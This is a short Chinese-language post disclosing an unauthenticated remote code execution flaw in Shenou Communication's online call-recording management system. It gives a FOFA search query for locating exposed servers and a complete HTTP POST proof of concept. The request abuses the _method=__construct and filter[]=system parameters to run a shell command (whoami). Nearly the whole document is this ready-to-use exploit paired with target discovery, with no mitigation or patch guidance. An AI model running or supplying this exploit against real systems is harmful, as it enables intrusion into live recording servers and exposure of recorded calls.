申瓯通信设备有限公司在线录音管理系统存在未授权RCE漏洞。

**fofa搜索语句**

title="在线录音管理系统"

POC：

```YAML

POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://fofa.info/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
If-None-Match: "4175964975"
If-Modified-Since: Sat, 11 May 2024 08:22:52 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

s=echo%20`whoami`&_method=__construct&method=POST&filter[]=system
```

